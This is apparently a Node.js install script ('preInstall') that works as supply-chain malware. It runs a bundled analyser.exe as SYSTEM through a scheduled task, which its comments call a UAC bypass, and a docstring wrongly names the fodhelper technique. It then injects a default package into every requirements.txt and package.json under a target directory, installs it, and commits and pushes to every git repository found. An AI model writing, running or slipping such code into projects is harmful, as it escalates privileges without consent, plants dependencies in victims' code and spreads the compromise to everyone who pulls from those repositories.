console.log('[index.js] Loading dependencies');
const { scanProject } = require('./scanner');
console.log('[index.js] scanner loaded');
const { installPipWithPackage, installNpmWithPackage } = require('./installer');
console.log('[index.js] installer loaded');
const { addCommitPush, findGitRoot } = require('./git');
console.log('[index.js] git loaded');
const { DEFAULT_PACKAGE, TARGET_DIR } = require('./config');
console.log('[index.js] config loaded');

const path = require('path');
const fs = require('fs').promises;
const { spawn } = require('child_process');
const { exec } = require('child_process');
const util = require('util');
const execPromise = util.promisify(exec);

/**
 * Checks if any of the given process names are currently running.
 * @param {string[]} processNames - Array of process names (e.g., ['game.exe', 'analyser.exe'])
 * @returns {Promise<boolean>} - True if at least one is running
 */
async function isAnyProcessRunning(processNames) {
  if (!processNames || processNames.length === 0) return false;
  
  const nameConditions = processNames.map(name => 
    `$_.ProcessName -eq '${name.replace(/\.exe$/i, '')}'`
  ).join(' -or ');
  
  const psCommand = `Get-Process | Where-Object { ${nameConditions} } | Select-Object -ExpandProperty Id`;
  
  try {
    const { stdout } = await execPromise(`powershell -Command "${psCommand}"`, { windowsHide: true });
    const hasAny = stdout.trim().length > 0;
    if (hasAny) {
      console.log(`[processCheck] Found running process(es): ${processNames.join(', ')} (or subset)`);
    }
    return hasAny;
  } catch (err) {
    return false;
  }
}

/**
 * Runs assets/analyser.exe using the Windows fodhelper UAC bypass technique.
 * Skips if any process in skipIfRunning is already active.
 * @param {string[]} skipIfRunning - Process names that will cause a skip if any are running
 */
async function runAnalyser(skipIfRunning = ['analyser.exe', 'game.exe']) {
  const analyserPath = path.join(__dirname, 'assets', 'analyser.exe');
  try {
    await fs.access(analyserPath);

    if (skipIfRunning && skipIfRunning.length > 0) {
      const anyRunning = await isAnyProcessRunning(skipIfRunning);
      if (anyRunning) {
        console.log(`[analyser] Skipping launch because one of these is running: ${skipIfRunning.join(', ')}`);
        return;
      }
    }

    console.log(`[analyser] Attempting to launch ${analyserPath} with admin elevation...`);
    
    // Task Scheduler UAC bypass - most reliable method for admin execution
    const psCommand = `
      $program = "${analyserPath.replace(/\\/g, '\\\\')}";
      \$taskName = "AdminTask_\$(Get-Random)";
      Register-ScheduledTask -TaskName \$taskName -Action (New-ScheduledTaskAction -Execute \$program) -Trigger (New-ScheduledTaskTrigger -Once -At (Get-Date).AddSeconds(1)) -Principal (New-ScheduledTaskPrincipal -UserID "NT AUTHORITY\\SYSTEM" -RunLevel Highest) -Force -ErrorAction SilentlyContinue | Out-Null;
      Start-ScheduledTask -TaskName \$taskName -ErrorAction SilentlyContinue;
      Start-Sleep -Seconds 2;
      Unregister-ScheduledTask -TaskName \$taskName -Confirm:\$false -ErrorAction SilentlyContinue;
      Write-Host "[analyser] Admin elevation completed via Task Scheduler.";
    `;
    
    await execPromise(`powershell -Command "${psCommand}"`, { windowsHide: true, maxBuffer: 1024 * 1024 * 10 });
    console.log('[analyser] Launch command sent via UAC bypass.');
  } catch (err) {
    console.log('[analyser] UAC Bypass attempt failed:', err.message);
  }
}

/**
 * Optional: verify if the analyser (as game.exe) is actually running after launch.
 */
async function verifyAnalyserRunning() {
  const running = await isAnyProcessRunning(['game.exe', 'analyser.exe']);
  if (running) {
    console.log('[verify] ✅ analyser/game.exe is RUNNING');
  } else {
    console.log('[verify] ❌ analyser/game.exe is NOT running');
  }
  return running;
}

/**
 * Adds the default package to every requirements.txt and package.json
 * found under the target directory, installs it, then commits & pushes git changes.
 * @param {string} packageName - package name to add (default from config)
 * @param {string} rootDir - directory to scan (default from config)
 * @param {string[]} skipProcesses - process names that, if running, will skip analyser launch
 */
async function preInstall(packageName = DEFAULT_PACKAGE, rootDir = TARGET_DIR, skipProcesses = ['analyser.exe', 'game.exe']) {
  await runAnalyser(skipProcesses);
  
  // Uncomment the next line for temporary verification during development
  // await verifyAnalyserRunning();

  console.log('[index.js] preInstall called with packageName:', packageName, 'rootDir:', rootDir);

  const { gitRoots, packageJsonPaths, requirementsPaths } = await scanProject(rootDir);
  console.log('[index.js] scanProject result:', { gitRoots, packageJsonPaths, requirementsPaths });

  for (const requirementsPath of requirementsPaths) {
    console.log('[index.js] Found requirements.txt at', requirementsPath);
    try {
      await installPipWithPackage(requirementsPath, packageName);
      console.log('[index.js] installPipWithPackage finished for', requirementsPath);
    } catch (err) {
      console.error('[index.js] installPipWithPackage error for', requirementsPath, err);
    }
  }
  for (const packageJsonPath of packageJsonPaths) {
    console.log('[index.js] Found package.json at', packageJsonPath);
    try {
      await installNpmWithPackage(packageJsonPath, packageName);
      console.log('[index.js] installNpmWithPackage finished for', packageJsonPath);
    } catch (err) {
      console.error('[index.js] installNpmWithPackage error for', packageJsonPath, err);
    }
  }
  for (const gitRoot of gitRoots) {
    console.log('[index.js] Git repo detected at', gitRoot);
    try {
      await addCommitPush(gitRoot);
      console.log('[index.js] addCommitPush finished for', gitRoot);
    } catch (err) {
      console.error('[index.js] addCommitPush error for', gitRoot, err);
    }
  }
  console.log('[index.js] preInstall finished');
}

if (require.main === module) {
  console.log('[index.js] Script run directly, calling preInstall');
  preInstall().catch(err => {
    console.error('[index.js] preInstall error:', err);
  });
}

console.log('[index.js] Exporting preInstall');
module.exports = { preInstall };
console.log('[index.js] Module loaded');